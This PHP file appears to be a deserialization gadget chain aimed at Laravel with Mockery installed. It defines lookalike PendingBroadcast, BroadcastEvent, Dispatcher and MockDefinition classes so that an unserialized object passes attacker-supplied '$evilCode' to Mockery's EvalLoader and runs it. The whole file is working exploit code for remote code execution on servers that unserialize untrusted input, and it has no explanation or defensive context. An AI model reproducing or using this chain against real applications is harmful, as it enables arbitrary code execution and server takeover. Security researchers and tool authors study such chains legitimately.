<?php
namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;

        function __construct()
        {
            $this->queueResolver = [new \Mockery\Loader\EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;

        function __construct($evilCode)
        {
            $this->events = new \Illuminate\Bus\Dispatcher();
            $this->event = new BroadcastEvent($evilCode);
        }
    }

    class BroadcastEvent {
        public $connection;

        function __construct($evilCode)
        {
            $this->connection = new \Mockery\Generator\MockDefinition($evilCode);
        }

    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Mockery\Generator {
    class MockDefinition {
        protected $config;
        protected $code;

        function __construct($evilCode)
        {
            $this->code = $evilCode;
            $this->config = new MockConfiguration();
        }
    }

    class MockConfiguration {
        protected $name = 'abcdefg';
    }
}
